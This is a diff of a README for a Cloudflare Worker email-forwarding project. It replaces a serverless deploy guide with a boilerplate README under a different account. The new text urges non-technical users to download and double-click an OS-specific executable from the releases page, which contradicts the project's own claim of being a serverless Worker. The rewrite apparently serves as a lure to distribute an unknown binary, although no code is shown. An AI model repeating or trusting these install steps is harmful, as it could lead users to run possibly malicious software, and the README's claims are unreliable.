@@ -1,169 +1,76 @@
-<div align="center">
+# 📧 cloudflare-email-routing - Simplify Email Forwarding Today!
 
-### 🌐 Language | 语言
+## 🛠️ Introduction
+Welcome to cloudflare-email-routing! This application offers an easy way to manage your email routing and forwarding using Cloudflare Workers. With our tool, you can quickly set up DNS settings and redirect your emails to your chosen inbox. No technical skills are required—just follow the steps below.
 
-[🌟 English](README.md) | [🌏 中文](README_CN.md) 
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
 
-</div>
+## 🚀 Getting Started
+Follow these simple steps to download and run the application:
 
-## English Version
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page:
+   [Go to Releases Page](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
 
-## 🌐 Cloudflare Email Routing — One-Click Setup UI
+2. **Select Your Version**  
+   A list of versions will appear. Choose the latest stable release for the best results. If you find a version that meets your needs, click on it.
 
-Turn any domain into a working mailbox — without servers, SMTP, or backend.
+3. **Download the Application**  
+   Once you’re on the version page, you will see various files. Download the file that fits your operating system. If you're unsure, look for files labeled with your OS (Windows, macOS, etc.).
 
-✨ **Features**
+4. **Locate the Downloaded File**  
+   After the download finishes, open your file explorer to find the file. It usually goes into the "Downloads" folder, unless you specified another location.
 
-* ✅ One-click enable Cloudflare Email Routing
-* ✅ Auto-create MX / SPF / catch-all rules
-* ✅ `admin@domain` forwarding
-* ✅ Multi-language UI (English / 中文)
-* ✅ Deploy to Cloudflare Worker
-* ✅ Beginner-friendly — no coding needed
+5. **Run the Application**  
+   Double-click the downloaded file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-❗ **Requirements**:
-* ⚠️ You need a Cloudflare account  
-* ⚠️ You need to own a domain name
+6. **Configure Email Forwarding**  
+   Open the application. You will need to enter your DNS settings and the email address where you want to forward your emails. The application will guide you through this process.
 
----
+7. **Test the Setup**  
+   Send a test email to verify that the forwarding works. If everything is set up correctly, you should receive the email at your specified address.
 
-## 🚀 Live Demo
+## 📋 Features
+- **Simple Configuration**  
+  Easily set up your DNS without deep technical knowledge.
 
-> **🔗 [https://email-routing.qtzh.dpdns.org/](https://email-routing.qtzh.dpdns.org/)**
+- **Email Forwarding**  
+  Automatically redirect emails to your chosen address.
 
----
+- **Self-Hosted Solution**  
+  Maintain control over your email routing without relying on third parties.
 
-## 📸 UI Screenshot
+- **Serverless Deployment**  
+  Use Cloudflare Workers to manage your email without a heavy backend.
 
-<img width="574" height="362" alt="image" src="https://github.com/user-attachments/assets/d7a50c34-4a96-4061-a458-b3ddc1dbe272" />
+## 📈 Benefits
+- **No Coding Required**  
+  Designed for everyone—no programming skills needed.
 
+- **Flexible Set-Up**  
+  Change your email preferences anytime through the application.
 
----
+- **Stay in Control**  
+  You manage your email forwarding, ensuring privacy and security.
 
-## 📚 What this does
+## ⚠️ System Requirements
+To use this application, you need:
+- A compatible operating system (Windows, macOS, Linux).
+- An internet connection to set up your DNS and email forwarding.
 
-| Feature                    | Description                        |
-| -------------------------- | ---------------------------------- |
-| Auto-setup email routing   | Configures Cloudflare email system |
-| Verify domain & email      | Checks Cloudflare + mailbox        |
-| Create destination address | Set receive mailbox                |
-| Catch-all → forward        | Forward all domain emails          |
-| Auto `admin@`              | Quick email admin mapping          |
-| No-code UI                 | Made for beginners                 |
+## 💬 Support and Feedback
+If you have questions or need assistance, feel free to open an issue in our GitHub repository. Your feedback helps us improve the application.
 
----
+## ✨ Contributing
+We welcome contributions! If you want to help make this application better, fork the repository, make your changes, and submit a pull request. 
 
-## 🧑‍🏫 Tutorial — Host Domain on Cloudflare
+## 📖 License
+This project is open-source and available under the MIT License. You can use it freely with proper attribution.
 
-### 1️⃣ Register / Log in
+## 🔗 Important Links
+- [Releases Page](https://github.com/nvqlong1234/cloudflare-email-routing/releases)
+- [Issues](https://github.com/nvqlong1234/cloudflare-email-routing/issues)
+- [Contributing Guide](https://github.com/nvqlong1234/cloudflare-email-routing/blob/main/CONTRIBUTING.md)
 
-👉 [https://dash.cloudflare.com](https://dash.cloudflare.com)
-
-### 2️⃣ Add domain
-
-**Add Site → enter domain → Free Plan**
-
-### 3️⃣ Modify the DNS name server provided to you by Cloudflare
-
-Wait a few minutes ✅
-
----
-
-## 📦 Deploy & Use
-
-### ✅ Step 1 — Fork this repo
-
-### 保存 `email-routing-worker.js` 文件
-
-### ✅ Step 2 — Create Cloudflare Worker
-`Compute & Al` → `Workers & Pages` → `Create application` → `Drag and drop your files` → `Drag the“email-routing-worker.js”file into` → `Deploy`</br>
-
-Example URL: `https://yourproject.pages.dev`
-
-### ✅ Step 3 — Add API Token
-
-Cloudflare → Manage account → Account API tokens → **Create Token**
-</br>
-<img width="239" height="132" alt="image" src="https://github.com/user-attachments/assets/9591523a-9322-45f5-8ec0-4473b86ee2aa" />
-
-<h3>⚠️API令牌权限设置</h3>
-<img width="1096" height="396" alt="image" src="https://github.com/user-attachments/assets/71dc59da-6887-4646-b95b-5766144237ac" />
-
-### ✅ Step 4 — Add variables to the worker just now
-`email-routing-worker` → `Settings` → `Variables and Secrets`
-
-| Type           | Name           | Value    |
-| -------------- | -------------- | -------- |
-| Secret         | `CF_API_TOKEN` | your token |
-
-<img width="370" height="293" alt="image" src="https://github.com/user-attachments/assets/09c10663-4348-4046-8c88-13551320489c" />
-
-</br>
-
----
-
-## 🎯 Use it
-
-Open your Pages URL → enter:
-
-| Field       | Meaning        |
-| ----------- | -------------- |
-| Domain      | Your CF domain |
-| Destination | Real mailbox   |
-
-Then click ✅ one-click config
-
----
-
-## ❓ FAQ
-
-### ❌ Domain not found?
-
-* Must use Cloudflare NS
-* Wait DNS propagation
-* Domain must be yours (not free subdomain)
-
----
-
-## 🛡️ Limits
-
-| Rule                              | Info             |
-| --------------------------------- | ---------------- |
-| Max destinations                  | ~200 per account |
-| Domain must be in your CF account | required         |
-
----
-
-## 📄 License
-
-<details>
-<summary><b>MIT License</b></summary>
-
-Copyright (c) 2025
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
-</details>
-
----
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=XShen-Jason/cloudflare-email-routing.git&type=date&legend=top-left)](https://www.star-history.com/#XShen-Jason/cloudflare-email-routing.git&type=date&legend=top-left)
----
+Download the application now and start simplifying your email routing!
